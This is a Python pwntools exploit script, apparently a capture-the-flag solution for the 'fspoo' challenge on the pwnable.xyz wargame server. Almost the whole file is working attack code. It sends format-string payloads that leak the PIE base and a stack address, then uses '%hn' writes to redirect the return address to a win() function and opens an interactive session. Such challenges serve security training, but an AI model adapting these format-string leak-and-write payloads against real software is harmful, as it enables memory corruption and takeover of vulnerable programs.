# exploit_fspoo.py

from pwn import *

# r = process("./fspoo")
r = remote("svc.pwnable.xyz", 30010)

def Edit(Name):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(Name)

def Prep():
    r.recvuntil("> ")
    r.sendline("2")

def Print():
    r.recvuntil("> ")
    r.sendline("3")

def Exit():
    r.recvuntil("> ")
    r.sendline("0")

r.recvuntil("Name: ")
r.sendline("A" * 0x19 + "%11$p")

Prep()
PIEbase = int(r.recvline()[2:-1], 16) - 0xa77 # address of PIE base
addr_win = PIEbase + 0x9fd # address of win()
log.info("address of win(): " + hex(addr_win))
addr_cmd = PIEbase + 0x2040 # address of variable 'cmd'
log.info("address of variable 'cmd': " + hex(addr_cmd))

Edit("A" * 0x19 + "%10$p")
Prep()
addr_ret = int(r.recvline()[2:-1], 16) - 0xc # address where return address is on
log.info("return address is on " + hex(addr_ret))

writable = addr_cmd + 0xc0 # address of writable memory
log.info("address of writable memory: " + hex(writable))

Edit("A" * 0x19 + "B%6$hn")
r.recvuntil("> ")
r.sendline(str(writable + 0x2))

for i in range(0x26, 0x30):
    r.recvuntil("> ")
    r.sendline(str(addr_cmd + i))

addr_win_low = int(hex(addr_win)[6:], 16) # low 2byte of address of win()

r.recvuntil("> ")
r.sendline(str(writable + 0x1))
r.recvuntil("Name: ")
r.send("%" + str(addr_win_low - 0x19) + "x%6$hn")

r.recvuntil("> ")
r.sendline("-" + str(0x100000000 - addr_ret))

Exit()

r.interactive()